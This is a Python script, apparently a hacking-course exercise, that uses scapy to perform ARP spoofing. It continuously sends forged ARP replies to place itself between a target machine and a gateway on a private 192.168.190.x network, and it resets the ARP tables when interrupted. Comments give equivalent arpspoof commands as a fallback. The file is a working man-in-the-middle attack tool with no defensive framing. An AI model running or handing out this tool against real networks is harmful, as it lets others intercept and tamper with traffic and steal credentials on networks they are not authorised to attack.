#!/usr/bin/env python
import sys
import time
import scapy.all as scapy


# If it's not working
# Keep it simple
# $ arpspoof -i eth0 -t 192.168.190.2 192.168.190.141
# $ arpspoof -i eth0 -t 192.168.190.141 192.168.190.2
# but you know, just verify the IP's

target_ip = "192.168.190.130"
gateway_ip = "192.168.190.2"


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        # < Python 2.7
        print("\r[+] Packets sent: " + str(sent_packets_count)),  # \r force print at line start
        sys.stdout.flush()  # Tells Python to flush the buffer

        # > Python >3
        # print("\r[+] Packets sent: " + str(sent_packets_count), end="")

        time.sleep(2)


except IndexError:
    print(target_ip)
    print(gateway_ip)
    pass


except KeyboardInterrupt:
    print("\n[+] Canceled ...\n")
    restore(target_ip, gateway_ip)
    print("Reseted ARP tables")
